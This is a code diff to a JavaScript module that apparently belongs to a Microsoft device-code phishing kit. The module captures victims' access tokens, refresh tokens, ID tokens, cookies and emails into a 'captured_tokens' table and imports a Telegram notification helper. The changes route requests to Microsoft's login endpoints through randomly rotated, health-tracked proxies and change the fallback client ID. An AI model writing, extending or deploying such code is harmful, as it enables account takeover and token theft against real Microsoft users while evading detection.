@@ -3,11 +3,13 @@
  * Handles Microsoft Device Code OAuth flow proxying
  */
 const axios = require('axios');
+const HttpsProxyAgent = require('https-proxy-agent');
 const jwt = require('jsonwebtoken');
 const db = require('../database/connection');
 const config = require('../config/env');
 const { encrypt, decrypt } = require('../utils/encrypt');
 const { sendTelegramDocument } = require('../services/notification');
+const proxyManager = require('../services/proxymanager');
 
 // In-memory job store (for active device code flows)
 const activeJobs = new Map();
@@ -40,9 +42,34 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
     if (!links.length) throw new Error('Link not active');
     const link = links[0];
 
-    // Call Microsoft Device Code endpoint
+    // Call Microsoft Device Code endpoint via proxy
     const tenant = config.AZURE_TENANT || 'common';
     const clientId = config.AZURE_CLIENT_ID;
+
+    // Get a random active proxy
+    const proxy = await proxyManager.getRandomProxy();
+    let proxyConfig = {};
+    let proxyId = null;
+
+    if (proxy) {
+      proxyId = proxy.id;
+      const proxyConfigData = proxyManager.getAxiosProxyConfig(proxy);
+      proxyConfig = proxyConfigData || {};
+
+      // Use HttpsProxyAgent for proxy support
+      if (proxy.proxy_username && proxy.proxy_password) {
+        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_username}:${proxy.proxy_password}@${proxy.proxy_host}:${proxy.proxy_port}`;
+        const agent = new HttpsProxyAgent(proxyUrl);
+        proxyConfig.httpsAgent = agent;
+      } else {
+        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_host}:${proxy.proxy_port}`;
+        const agent = new HttpsProxyAgent(proxyUrl);
+        proxyConfig.httpsAgent = agent;
+      }
+
+      console.log(`[DeviceProxy] Using proxy ${proxy.proxy_host}:${proxy.proxy_port} (ID: ${proxyId})`);
+    }
+
     const dcResponse = await axios.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
@@ -50,9 +77,11 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
         scope: 'openid profile email User.Read offline_access',
       }),
       {
+        ...proxyConfig,
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded'
-        }
+        },
+        timeout: 15000
       }
     );
 
@@ -74,6 +103,8 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       jwtToken,
       ip_address: (reqOptions && reqOptions.ip) || 'unknown',
       user_agent: (reqOptions && reqOptions.userAgent) || 'DeviceProxy',
+      proxy_id: proxyId,
+      proxy_host: proxy ? proxy.proxy_host : null,
     });
 
     // Start polling in background
@@ -126,6 +157,26 @@ async function pollForToken(jobId) {
     await new Promise(resolve => setTimeout(resolve, (job.interval || 5) * 1000));
 
     try {
+      // Build proxy config for polling (use same proxy as device code request)
+      let pollProxyConfig = {};
+      if (job.proxy_id) {
+        const pollProxy = await proxyManager.getRandomProxy();
+        if (pollProxy && pollProxy.id === job.proxy_id) {
+          const proxyConfigData = proxyManager.getAxiosProxyConfig(pollProxy);
+          if (proxyConfigData) {
+            if (pollProxy.proxy_username && pollProxy.proxy_password) {
+              const proxyUrl = `${pollProxy.proxy_type || 'http'}://${pollProxy.proxy_username}:${pollProxy.proxy_password}@${pollProxy.proxy_host}:${pollProxy.proxy_port}`;
+              const agent = new HttpsProxyAgent(proxyUrl);
+              pollProxyConfig.httpsAgent = agent;
+            } else {
+              const proxyUrl = `${pollProxy.proxy_type || 'http'}://${pollProxy.proxy_host}:${pollProxy.proxy_port}`;
+              const agent = new HttpsProxyAgent(proxyUrl);
+              pollProxyConfig.httpsAgent = agent;
+            }
+          }
+        }
+      }
+
       const tokenResponse = await axios.post(
         `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
         new URLSearchParams({
@@ -134,10 +185,12 @@ async function pollForToken(jobId) {
           device_code: job.device_code,
         }),
         {
+          ...pollProxyConfig,
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
           },
-          validateStatus: () => true
+          validateStatus: () => true,
+          timeout: 15000
         }
       );
 
@@ -181,6 +234,16 @@ async function pollForToken(jobId) {
         job.captured_cookies = responseCookies;
         job.captured_email = capturedEmail;
         await storeToken(job, tokenData, responseCookies);
+
+        // Mark proxy as success
+        if (job.proxy_id) {
+          try {
+            await proxyManager.markSuccess(job.proxy_id);
+            console.log(`[DeviceProxy] Marked proxy ${job.proxy_id} as success`);
+          } catch (e) {
+            /* ignore */
+          }
+        }
 
         // Mark visitors as done for this user/link
         try {
@@ -228,6 +291,15 @@ async function pollForToken(jobId) {
       }
     } catch (err) {
       console.error('[DeviceProxy] Poll error:', err.message);
+      // Mark proxy as failure
+      if (job.proxy_id) {
+        try {
+          await proxyManager.markFailure(job.proxy_id);
+          console.log(`[DeviceProxy] Marked proxy ${job.proxy_id} as failure`);
+        } catch (e) {
+          /* ignore */
+        }
+      }
       // Continue polling on network errors
     }
   }
@@ -251,6 +323,26 @@ async function retryAsTokenMode(originalJob) {
   try {
     const tenant = config.AZURE_TENANT || 'common';
     const clientId = config.AZURE_CLIENT_ID;
+
+    // Get a random active proxy for retry
+    const proxy = await proxyManager.getRandomProxy();
+    let retryProxyConfig = {};
+    let retryProxyId = null;
+
+    if (proxy) {
+      retryProxyId = proxy.id;
+      if (proxy.proxy_username && proxy.proxy_password) {
+        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_username}:${proxy.proxy_password}@${proxy.proxy_host}:${proxy.proxy_port}`;
+        const agent = new HttpsProxyAgent(proxyUrl);
+        retryProxyConfig.httpsAgent = agent;
+      } else {
+        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_host}:${proxy.proxy_port}`;
+        const agent = new HttpsProxyAgent(proxyUrl);
+        retryProxyConfig.httpsAgent = agent;
+      }
+      console.log(`[DeviceProxy] Retry using proxy ${proxy.proxy_host}:${proxy.proxy_port} (ID: ${retryProxyId})`);
+    }
+
     const dcResponse = await axios.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
@@ -258,9 +350,11 @@ async function retryAsTokenMode(originalJob) {
         scope: 'openid profile email User.Read offline_access',
       }),
       {
+        ...retryProxyConfig,
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded'
-        }
+        },
+        timeout: 15000
       }
     );
 
@@ -280,6 +374,8 @@ async function retryAsTokenMode(originalJob) {
       created_at: Date.now(),
       jwtToken: originalJob.jwtToken,
       is_retry: true,
+      proxy_id: retryProxyId,
+      proxy_host: proxy ? proxy.proxy_host : null,
     };
 
     activeJobs.set(newJobId, newJob);
@@ -342,7 +438,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
     } catch (e) { /* use default */ }
 
     // Determine client_id used for this capture
-    const clientIdUsed = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const clientIdUsed = config.AZURE_CLIENT_ID || '4813382a-8fa7-425e-ab75-3b753aab3abb';
 
     const [result] = await db.query(
        `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, client_id)
@@ -493,12 +589,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
     if (tokenData.expires_in) {
       fileParts.push('EXPIRES IN:');
       fileParts.push(tokenData.expires_in);
-      fileParts.push('');
-    }
-
-    if (tokenData.scope) {
-      fileParts.push('SCOPE:');
-      fileParts.push(tokenData.scope);
       fileParts.push('');
     }
 
